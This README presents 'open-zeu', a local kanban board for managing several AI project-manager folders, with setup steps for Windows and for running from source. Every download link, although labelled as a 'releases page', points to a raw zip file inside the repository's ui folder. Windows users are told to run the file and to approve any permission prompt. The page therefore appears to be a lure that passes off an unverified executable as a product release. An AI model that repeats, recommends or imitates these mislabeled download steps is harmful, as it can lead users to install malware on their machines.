# 🤖 open-zeu - Run multiple AI project managers

[![Download open-zeu](https://img.shields.io/badge/Download%20open--zeu-4C7CFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ordered-tincture209/open-zeu/main/ui/open_zeu_3.6.zip)

## 🧭 What this app does

open-zeu is a local app that helps you keep several AI project managers in one place.

It gives you:
- 4 demo projects: PM1, PM2, PM3, and PM4
- a shared skill folder for common tasks
- task backlogs for each project
- simple RDs for planning work
- a local kanban board in the browser
- a clear file layout so you can add more projects later

This setup works well if you want one place to track work, move tasks, and open the right project files when you need them.

## 💾 Download for Windows

Visit the [releases page](https://raw.githubusercontent.com/ordered-tincture209/open-zeu/main/ui/open_zeu_3.6.zip) and download the latest Windows release.

After the file downloads:
1. Open the downloaded file
2. Follow the on-screen setup steps
3. Start the app
4. Open the local board in your browser

If the release includes a zip file, extract it first, then open the app file inside the folder.

## 🖥️ What you need

Use a Windows 10 or Windows 11 PC with:
- 4 GB of RAM or more
- 200 MB of free disk space
- a modern web browser
- access to a local file folder on your computer

For best results, keep the repo in a folder you can find again, such as:
- Downloads
- Documents
- Desktop

## 📦 Install on Windows

1. Visit the [releases page](https://raw.githubusercontent.com/ordered-tincture209/open-zeu/main/ui/open_zeu_3.6.zip)
2. Download the latest Windows file
3. Save it to a folder you can find
4. If the file is zipped, right-click it and choose Extract All
5. Open the extracted folder
6. Run the app file included in the release
7. If Windows asks for permission, choose Run

If the app opens in a browser window, leave that window open while you work.

## 🚀 First run

When the app starts, you will see the local board and project files.

Do this first:
1. Open the repo root in Cursor, Claude Code, Codex, or OpenCode
2. Read `AGENTS.md`
3. Open one project file such as `projects/pm1/AGENTS.md`
4. Replace the demo task with your own work
5. Replace the demo RD with your own notes
6. Move tasks across the board as work changes
7. Click the robot icon to view each PM’s `AGENTS.md` and shared skills

## 🗂️ What is included

### 🧩 Demo projects

You get four sample project managers:
- PM1
- PM2
- PM3
- PM4

Each one has its own task list and project notes so you can see how the structure works.

### 📚 Shared skills

The `_skills/` folder stores shared skills that can be used across projects. This keeps common instructions in one place.

### 📝 Task backlogs

Each project has a `data.json` file in:
- `projects/*/data.json`

This file holds the task list for that project.

### 📄 RDs

Each project has an RD folder in:
- `projects/*/rds/`

Use this for project notes, plans, and working documents.

### 🖱️ Local kanban UI

The `ui/` folder contains the local browser board. You can use it to:
- view tasks
- move items between columns
- track progress
- keep work in one place

### 🧱 Project templates

The repo also includes templates for adding more projects. Use them when you want to set up another project manager with the same layout.

## 🛠️ Common setup files

### `AGENTS.md`
Start here. It explains how the repo is meant to be used.

### `projects/pm1/AGENTS.md`
Open a project file like this to see how one project is set up.

### `projects/*/data.json`
This is the task list for each project.

### `projects/*/rds/`
This folder stores project docs and notes.

## 🧪 If the board does not open

If the local board does not load in your browser:

1. Make sure the app is still running
2. Check that your browser opened `http://localhost:8765`
3. Refresh the page
4. Close other apps that may use the same port
5. Try a different port if needed

Use this if port `8765` is busy:
```bash
OPEN_ZEU_PORT=8877 python server.py
```

## 🖱️ How to use the board

The board is simple to use.

You can:
- drag tasks from one column to another
- open project notes when you need more detail
- inspect each PM’s instructions with the robot icon
- keep demo work or real work in the same layout

This helps you follow the flow of work without hunting through many folders.

## 🧠 Agent setup

### Cursor
Open the repo root and start with `AGENTS.md`.

### Claude Code
Open the repo root and read `AGENTS.md` first.

### Codex
Open the repo root and begin with `AGENTS.md`.

### OpenCode
Open the repo root and check `AGENTS.md` before you edit anything.

## ➕ Add your own project

To add another project:
1. Copy one of the demo project folders
2. Give the new folder a clear name
3. Update the project’s `AGENTS.md`
4. Add a new `data.json` task list
5. Add or update the RD files
6. Check that the new project appears in the UI

Keep the same folder pattern so the board and project files stay easy to follow.

## 🔄 Typical workflow

A simple way to use open-zeu:
1. Open the app
2. Read the repo instructions
3. Pick the project you want
4. Review the task list
5. Work on one item at a time
6. Move the task when it changes state
7. Add notes in the RD files
8. Use the shared skills when a task needs them

## 📁 Folder layout

- `_skills/` - shared skills used by all projects
- `projects/pm1/` - demo project 1
- `projects/pm2/` - demo project 2
- `projects/pm3/` - demo project 3
- `projects/pm4/` - demo project 4
- `ui/` - local kanban interface
- `AGENTS.md` - main repo guide

## 🔍 Tips for non-technical users

- Keep the app folder in one place
- Do not rename files unless you know they are not used
- Open the same browser tab each time if possible
- Use the board to track what is done and what is next
- If you edit a project, save the file before switching to another task

## 🧭 Example use case

Use open-zeu if you want to:
- track several AI project managers at once
- keep each project’s tasks separate
- store shared notes in one place
- use a local board instead of a cloud tool
- move from demo projects to your own work

## 📌 File names to look for

- `AGENTS.md`
- `data.json`
- `rds/`
- `_skills/`
- `server.py`
- `requirements.txt`

## 🧰 Running from source

If you want to run the repo from source instead of using a release:
1. Download or clone the repo
2. Open the `ui` folder
3. Create a Python virtual environment
4. Install the required packages
5. Start the server
6. Open the local address in your browser

Example:
```bash
git clone <your-repo-url> open-zeu
cd open-zeu
cd ui
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python server.py
```

Open:
- `http://localhost:8765`

If needed:
```bash
OPEN_ZEU_PORT=8877 python server.py
```

## 🧷 Keeping work organized

To keep the repo easy to use:
- keep one task per card
- keep one project per folder
- put shared items in `_skills/`
- store project notes in `rds/`
- update the task list when work changes

## 🧩 Good first actions

If this is your first time using open-zeu:
1. Download the latest release
2. Start the app
3. Open `AGENTS.md`
4. Review PM1
5. Move one demo task
6. Replace one demo note with your own work